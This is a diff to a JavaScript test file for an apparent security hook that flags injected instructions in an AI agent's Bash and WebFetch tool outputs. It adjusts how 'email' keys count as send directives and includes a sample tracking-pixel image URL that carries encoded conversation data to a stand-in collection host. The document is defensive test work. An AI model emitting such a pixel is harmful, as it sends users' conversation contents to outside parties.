@@ -161,9 +161,13 @@ test("door gates: badge images, install links and package.json \"email\" keys do
   for (const [name, text] of [["cat package.json", pkg], ["cat README.md", readme]]) {
     const r = await postRun(ON, post("Bash", { command: name }, bashResponse(text)));
     assert.deepEqual(findings(r.alerts, "hook:Bash").map((a) => a.threatId), [], `${name}: must not alert at the Bash door`);
-    // control: the web-tuned gate on WebFetch still fires on the same text, so the door gate is what differs
+    // control: the web-tuned gate on WebFetch still fires on the README, so the door gate is what differs.
+    // The JSON `"email": "…"` key is quiet on WebFetch too since v1.11.0 (the web #15 gate needs "… to
+    // <address>"; test/webfetch-fp-narrowing.test.mjs), so package.json is no longer a control.
     const w = await postRun(ON, post("WebFetch", { url: "https://x.example/p", prompt: "summarise" }, text));
-    assert.ok(findings(w.alerts, "hook:WebFetch").some((a) => a.threatId === 15 || a.threatId === 17), `control: ${name} still alerts on WebFetch`);
+    const webIds = findings(w.alerts, "hook:WebFetch").map((a) => a.threatId);
+    if (name === "cat README.md") assert.ok(webIds.includes(17), `control: ${name} still alerts on WebFetch`);
+    else assert.ok(!webIds.includes(15), `${name}: a JSON email key is not a send directive on WebFetch either`);
   }
   // and a data-carrying tracking pixel still counts at the door
   const px = await postRun(ON, post("Bash", { command: "cat issue.md" }, bashResponse("Thanks!\n\n![](https://collect.example.net/px?d=Q09OVkVSU0FUSU9OX0I2NA)\n")));
